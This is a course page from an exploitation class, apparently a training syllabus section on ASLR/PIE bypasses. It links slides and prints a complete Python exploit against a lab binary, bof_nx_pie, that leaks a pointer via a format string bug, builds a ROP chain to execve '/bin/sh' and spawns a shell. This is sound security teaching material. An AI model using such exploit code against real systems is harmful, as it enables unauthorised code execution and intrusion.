===========================
Day 2 - 4 ASLR PIE Bypasses
===========================

Below is the PowerPoint on ASLR PIE Bypasses for this section.

:download:`ASLR PIE Bypasses PowerPoint<media/day2/aslr_pie_bypasses.pptx>`

Activities
----------

Below is the PowerPoint for the activities for this section, as well
as some of the files that go along with it.

:download:`Bypassing ASLR via Memory Read PowerPoint<media/day2/bypassing_aslr_via_memory_read.pptx>` 

:download:`dof NX PIE zip<media/day2/bof_nx_pie.zip>`

::

    #exploit.py
    #!/usr/bin/python2

    # Exploit for /usr/local/bin/bof_nx_pie
    # Uses ROP to defeat NX
    # Uses format string to leak pointer, to defeat PIE


    import subprocess, struct, sys


    # Open the process and setup stdin/stdout pipes
    p = subprocess.Popen(
            ["/usr/local/bin/bof_nx_pie"],
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE
    )


    # Abuse the format string vulnerability to leak a pointer
    # "%3$" says "the third argument on the stack"
    # "08x" says "formated as a hexidecimal number, 0-padded to 8 places
    p.stdin.write("%3$08x\n")
    leak_addr = p.stdout.readline()


    # Convert it from hex, subtract 0x6ec to get the PIE base address
    base_addr = int(leak_addr, 16) - 0x6ec
    print "Found base address: %08x" % base_addr


    # Dynamically calculated ROP chain
    # Performs execve("/bin/sh", 0, 0);
    # "<L" means "little-endian 4-byte unsigned integer"
    rop_chain = struct.pack("<L", base_addr + 0x885)                # pop eax; ret;
    rop_chain += struct.pack("<L", 0x0000000b)                              # SYS_execve
    rop_chain += struct.pack("<L", base_addr + 0x4e1)               # pop ebx; ret;
    rop_chain += struct.pack("<L", base_addr + 0x202c)              # * -> "/bin/sh"
    rop_chain += struct.pack("<L", base_addr + 0x8ab)               # xor ecx, ecx; ret;
    rop_chain += struct.pack("<L", base_addr + 0x8ae)               # xor edx, edx; ret;
    rop_chain += struct.pack("<L", base_addr + 0x7a0)               # int 0x80; ret


    # Build full overflow string
    fill_buffer = "AAAAAAAAAAAAAAAA"
    gcc_padding = "BBBBBBBB"
    saved_ebp = "CCCC"
    overflow = fill_buffer + gcc_padding + saved_ebp + rop_chain


    # Do it!
    p.stdin.write(overflow + "\n")
    print p.stdout.readline(),


    # We should now have an interactive shell!
    while True:
            print "$ ",
            p.stdin.write(sys.stdin.readline())
            print p.stdout.readline(),
